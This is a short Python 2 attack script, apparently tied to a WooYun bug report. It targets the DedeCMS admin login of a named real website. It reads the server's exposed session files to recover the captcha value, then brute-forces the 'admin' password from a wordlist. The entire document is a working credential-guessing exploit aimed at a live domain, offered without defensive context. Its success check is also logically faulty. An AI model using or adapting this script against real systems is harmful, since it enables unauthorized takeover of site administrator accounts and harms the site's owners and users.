//http://www.wooyun.org/bug.php?action=view&id=75051
# -*- coding:utf-8 -*-
import requests
import re
pass_dict = open('passwords.txt','r')

def GetSession():
    global r
    r = requests.session()
    url = "http://www.chinabaiekr.com/include/vdimgck.php"
    get = r.get(url)
    PHPSESSID = get.cookies['PHPSESSID']
    session_url  = "http://www.chinabaiekr.com/" + 'data/sessions/sess_' + PHPSESSID
    session_get = requests.get(session_url)
    session_get = session_get.content
    regex = "securimage\_code\_value\|s\:4\:\"(.*?)\"\;"
    key = re.findall(regex,session_get)
    global k
    for k in key:
        print k



def Reqpost():
    headers = {"Content-type":"application/x-www-form-urlencoded"}
    payload = "dopost=login&adminstyle=newdedecms&userid=admin&pwd=%s&validate=%s" %(password,k)
    print payload
    post_url = "http://www.chinabaiekr.com/dede/login.php"
    content = r.post(post_url,data=payload,headers=headers,allow_redirects=False)
    print content.content
    if (r'密码错误' or '404 Not Found' in content.content) == False:
        return False



for password in pass_dict:
    GetSession()
    if False == Reqpost():
        break
